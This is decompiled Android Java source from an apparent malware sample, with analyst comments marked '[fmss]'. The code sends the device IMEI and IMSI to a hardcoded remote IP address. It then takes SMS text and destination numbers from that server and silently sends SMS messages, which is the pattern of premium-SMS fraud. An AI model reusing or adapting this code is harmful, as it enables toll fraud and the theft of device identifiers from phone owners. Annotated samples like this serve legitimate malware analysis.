package com.amaz.onib;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.telephony.SmsManager;
import com.amaz.onib.ar;
import java.util.ArrayList;
/* loaded from: classes.dex */
public class o extends AsyncTask<h, Integer, b> {

    /* renamed from: a  reason: collision with root package name */
    private Context f739a;
    private boolean b;
    private a c;
    private Utils d;
    private SmsManager e = SmsManager.getDefault();

    /* loaded from: classes.dex */
    public interface a {
        void a(b bVar);
    }

    /* loaded from: classes.dex */
    public class b {

        /* renamed from: a  reason: collision with root package name */
        public int f740a = -1;
        public String b;

        public b() {
        }
    }

    public o(Utils utils, boolean z, a aVar) {
        this.f739a = null;
        this.d = null;
        this.f739a = Utils.ctx;
        this.d = utils;
        this.b = z;
        this.c = aVar;
    }

    // [fmss] This method connects to the IP http://139.129.132.111:8001/ specified in the class ar. With the URL additional informations 
    // are passed, such as the IMEI and the IMSI. 
    private void a(Context context, h hVar) {
        boolean z;
        try {
            q a2 = q.a(new at().a(hVar.s + ("?PropsId=" + hVar.e + "&Mobile=&IMEI=" + FSrvi.IMEI + "&IMSI=" + FSrvi.IMSI + "&CpParam=" + (hVar.f == 0 ? by.b(FSrvi.APPID) : hVar.z)), ar.b.GET));
            if (a2 == null) {
                throw new Exception("重试");
            } else if ("0".equals(a2.b()) || "18".equals(a2.b())) {
                if (a2.a()) {
                    z = false;
                    ArrayList<String> divideMessage = this.e.divideMessage(a2.c());
                    int i = 0;
                    while (true) {
                        int i2 = i;
                        if (i2 >= divideMessage.size()) {
                            break;
                        }
                        String str = divideMessage.get(i2);
                        bs.a("TAG", a2.d() + "###" + str);
                        if (this.b) {
                            bs.a("TAG", "回调########" + this.b);
                            Intent intent = new Intent(this.d.SEND_SMS_ACTION1);
                            intent.putExtra("isb", this.b);
                            intent.putExtra("feeData", hVar);
                            try {
                                this.e.sendTextMessage(a2.d(), null, str, PendingIntent.getBroadcast(context, 0, intent, 0), null);
                            } catch (IllegalArgumentException e) {
                                bs.c("TAG", "发送短信出错");
                            }
                            this.b = false;
                        } else {
                            bs.a("TAG", "ms");
                            try {
                                this.e.sendTextMessage(a2.d(), null, str, null, null);
                            } catch (IllegalArgumentException e2) {
                                bs.c("TAG", "发送短信出错");
                            }
                        }
                        i = i2 + 1;
                    }
                    Thread.sleep(10000L);
                } else {
                    z = true;
                    bs.a("TAG", "nll login");
                    Thread.sleep(3000L);
                }
                int i3 = 0;
                while (i3 < 12) {
                    try {
                        p a3 = p.a(new at().a(hVar.t + ("?PropsId=" + hVar.e + "&Mobile=&IMEI=" + FSrvi.IMEI + "&IMSI=" + FSrvi.IMSI + "&ContentSid=" + a2.e()), ar.b.GET));
                        if (a3 == null) {
                            throw new Exception("重试");
                        } else if (a3 != null && "400".equals(a3.a())) {
                            i3++;
                            bs.a("TAG", "请稍候..." + i3);
                            if (i3 == 12) {
                                bs.a("TAG", "b:" + i3 + " ");
                                throw new Exception("over");
                            }
                            Thread.sleep(10000L);
                        } else if ("0".equals(a3.a())) {
                            bs.a("TAG", "gok");
                            ArrayList<String> divideMessage2 = this.e.divideMessage(a3.b());
                            int i4 = 0;
                            while (true) {
                                int i5 = i4;
                                if (i5 >= divideMessage2.size()) {
                                    break;
                                }
                                String str2 = divideMessage2.get(i5);
                                bs.a("TAG", a2.d() + "###" + str2);
                                if (i5 != 0) {
                                    try {
                                        this.e.sendTextMessage(a2.d(), null, str2, null, null);
                                    } catch (IllegalArgumentException e3) {
                                        bs.c("TAG", "发送短信出错");
                                    }
                                } else if (!z || !this.b) {
                                    try {
                                        this.e.sendTextMessage(a3.c(), null, str2, PendingIntent.getBroadcast(context, 0, new Intent(this.d.SEND_SMS_ACTION2), 0), PendingIntent.getBroadcast(context, 0, new Intent(this.d.DELIVERED_SMS_ACTION2), 0));
                                    } catch (IllegalArgumentException e4) {
                                        bs.c("TAG", "发送短信出错");
                                    }
                                } else {
                                    Intent intent2 = new Intent(this.d.SEND_SMS_ACTION1);
                                    intent2.putExtra("feeData", hVar);
                                    intent2.putExtra("isb", this.b);
                                    try {
                                        this.e.sendTextMessage(a3.c(), null, str2, PendingIntent.getBroadcast(context, 0, intent2, 0), null);
                                    } catch (IllegalArgumentException e5) {
                                        bs.c("TAG", "发送短信出错");
                                    }
                                    this.b = false;
                                }
                                i4 = i5 + 1;
                            }
                            i3 = 12;
                        } else if ("503".equals(a3.a())) {
                            throw new Exception("503");
                        } else {
                            try {
                                int parseInt = Integer.parseInt(a3.a());
                                if (parseInt < 20 && parseInt != 0) {
                                    throw new Exception("PZ" + parseInt);
                                }
                            } catch (Exception e6) {
                            }
                            throw new Exception("重试");
                        }
                    } catch (Exception e7) {
                        if (e7.getMessage().startsWith("请求出错错误码=")) {
                            bs.a("TAG", "-----" + e7.getMessage());
                        } else {
                            bs.a("TAG", "++++" + e7.getMessage());
                        }
                        throw new Exception("重试");
                    }
                }
            } else if ("503".equals(a2.b())) {
                throw new Exception("503");
            } else {
                try {
                    int parseInt2 = Integer.parseInt(a2.b());
                    if (parseInt2 < 20 && parseInt2 != 0) {
                        throw new Exception("PZ" + parseInt2);
                    }
                } catch (Exception e8) {
                }
                throw new Exception("重试");
            }
        } catch (Exception e9) {
            if (e9.getMessage().startsWith("请求出错错误码=")) {
                bs.a("TAG", "-----" + e9.getMessage());
            } else {
                bs.a("TAG", "+++++" + e9.getMessage());
            }
            throw new Exception("重试");
        }
    }

    // [fmss] This method executes a new thread in background that tries to execute the method a(Context context, h hVar) of this class. 
    // In case an exception occurs it sets values of variables according to the content of the SMS received. 
    public b doInBackground(h... hVarArr) {
        b bVar = new b();
        if (!(hVarArr == null || hVarArr[0] == null)) {
            h hVar = hVarArr[0];
            try {
                bs.a("TAG", "gf-run:");
                a(this.f739a, hVar);
                bVar.f740a = -2;
            } catch (Exception e) {
                this.b = false;
                if ("503".equals(e.getMessage()) || "over".equals(e.getMessage())) {
                    bs.a("TAG", "OVER:  " + e.getMessage());
                    bVar.f740a = -3;
                } else if (e.getMessage() == null || !e.getMessage().startsWith("PZ")) {
                    this.b = false;
                } else {
                    bVar.f740a = -4;
                    bVar.b = e.getMessage().substring(2);
                }
            }
            return bVar;
        }
        bVar.f740a = -1;
        return bVar;
    }

    /* JADX INFO: Access modifiers changed from: protected */
    /* renamed from: a */
    public void onPostExecute(b bVar) {
        if (this.c != null) {
            this.c.a(bVar);
        }
    }
}
